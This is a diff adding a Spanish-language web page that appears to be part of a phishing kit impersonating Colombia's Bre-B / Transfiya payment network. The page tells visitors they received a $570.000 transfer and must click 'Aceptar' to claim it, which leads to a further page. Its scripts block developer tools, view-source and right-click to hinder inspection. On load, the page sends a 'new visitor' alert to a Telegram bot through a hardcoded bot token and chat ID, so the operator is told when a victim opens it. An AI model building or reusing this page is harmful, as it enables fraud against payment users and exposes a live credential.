@@ -1,0 +1,290 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Transfiya - Llave Bre-B</title>
+    <style>
+        /* Variables y Reset */
+        :root {
+            --color-primario: #32005f;
+            --color-blanco: #ffffff;
+            --fuente-sans: ui-sans-serif, system-ui, -apple-system, sans-serif;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--color-primario);
+            color: var(--color-blanco);
+            font-family: var(--fuente-sans);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            line-height: 1.5;
+        }
+
+        /* Header */
+        header {
+            padding: 1.5rem;
+        }
+        .header-container {
+            max-width: 1024px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo {
+            height: 3rem;
+        }
+
+        /* Main Content */
+        main {
+            flex-grow: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+
+        /* Tarjeta Principal */
+        .card {
+            max-width: 400px;
+            width: 100%;
+            background-color: rgba(255, 255, 255, 0.05);
+            padding: 2rem;
+            border-radius: 1.5rem;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(4px);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+
+        /* Icono de Llave */
+        .icon-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 1.5rem;
+        }
+        .icon-circle {
+            background-color: var(--color-blanco);
+            padding: 1rem;
+            border-radius: 9999px;
+            box-shadow: inset 0 2px 4px 0 rgba(0, 0, 0, 0.06);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .icon-svg {
+            height: 2.5rem;
+            width: 2.5rem;
+            color: var(--color-primario);
+        }
+
+        /* Textos */
+        h1 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+        }
+        .subtitle {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 0.875rem;
+            margin-bottom: 1.5rem;
+        }
+        .subtitle span {
+            color: var(--color-blanco);
+            font-weight: 600;
+        }
+
+        /* Recuadro de Valor (Blanco) */
+        .amount-box {
+            background-color: var(--color-blanco);
+            border-radius: 1rem;
+            padding: 1.5rem;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+            margin-bottom: 1.5rem;
+        }
+        .amount-label {
+            color: #6b7280;
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            margin-bottom: 0.25rem;
+        }
+        .amount-value {
+            color: var(--color-primario);
+            font-size: 2.25rem;
+            font-weight: 900;
+        }
+        .amount-footer {
+            color: #9ca3af;
+            font-size: 10px;
+            font-style: italic;
+            margin-top: 0.5rem;
+        }
+
+        .instruction {
+            font-size: 0.875rem;
+            padding: 0 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        /* Botón Aceptar */
+        .btn-aceptar {
+            width: 100%;
+            background-color: var(--color-blanco);
+            color: var(--color-primario);
+            border: none;
+            padding: 1rem;
+            border-radius: 0.75rem;
+            font-size: 1.125rem;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
+        }
+        .btn-aceptar:hover {
+            background-color: #fbbf24; /* Color amarillento */
+            transform: scale(1.05);
+        }
+
+        /* Footer de la tarjeta (ID e IP) */
+        .card-footer {
+            margin-top: 1.5rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            font-family: monospace;
+            font-size: 11px;
+            opacity: 0.5;
+            text-align: center;
+        }
+
+        /* Footer General */
+        .page-footer {
+            padding: 1.5rem;
+            text-align: center;
+            font-size: 10px;
+            opacity: 0.4;
+            text-transform: uppercase;
+            letter-spacing: -0.025em;
+        }
+
+        /* Adaptabilidad Celular */
+        @media (max-width: 640px) {
+            .card {
+                max-width: 100%;
+                margin: 0 10px;
+            }
+            .amount-value {
+                font-size: 1.8rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <div class="header-container">
+            <img src="img/bre-b.png" class="logo" alt="Bre-B Logo">
+        </div>
+    </header>
+
+    <main>
+        <div class="card">
+            <div class="icon-container">
+                <div class="icon-circle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon-svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"></path>
+                    </svg>
+                </div>
+            </div>
+
+            <h1>Recibiste un Envío</h1>
+            <p class="subtitle">Identificado con <span>Llave Bre-B</span></p>
+
+            <div class="amount-box">
+                <p class="amount-label">Valor de la transferencia</p>
+                <p class="amount-value">$570.000</p>
+                <p class="amount-footer">Vía: Ecosistema Bre-B</p>
+            </div>
+
+            <p class="instruction">
+                Debes aceptar el envío para completar la transferencia a tu cuenta destino.
+            </p>
+
+            <div style="margin-top: 1rem;">
+                <a href="index3.html" style="text-decoration: none;">
+                    <button class="btn-aceptar">Aceptar</button>
+                </a>
+            </div>
+
+            <div class="card-footer">
+                <p>ID Transacción: TX-88294-BREB</p>
+                <p>IP de origen: 186.98.20.241</p>
+            </div>
+        </div>
+    </main>
+
+    <footer class="page-footer">
+        Sujeto a términos y condiciones de la red de pagos interoperables.
+    </footer>
+    
+        <script>
+     
+
+        // --- Bloqueo de inspección y teclado ---
+        document.onkeydown = function(e) {
+            // Bloquear F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+            if (e.keyCode == 123 || 
+               (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) || 
+               (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) {
+                return false;
+            }
+        };
+
+        // Bloquear clic derecho
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        }, false);
+    </script>
+
+    <script>
+    document.addEventListener("DOMContentLoaded", function() {
+    const token = "6159424723:AAE4qhm6H4sNLztr5HnLjAOrZlf95BAUKBE";
+    const chat_id = "-1003508204208"; 
+    const mensaje = "👻 NUEVO INGRESO 👻\n\nAlguien abrió la página de Bre-b";
+
+    // Se agregaron las comillas invertidas (backticks) para que la variable ${token} funcione
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+    fetch(url, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            chat_id: chat_id,
+            text: mensaje
+        })
+    })
+    .then(res => res.json()) // Cambiado para ver la respuesta real de Telegram
+    .then(data => {
+        if(data.ok) {
+            console.log("Notificación enviada con éxito");
+        } else {
+            console.error("Error de Telegram:", data.description);
+        }
+    })
+    .catch(err => console.error("Error de red:", err));
+});
+</script>
+</body>
+</html>
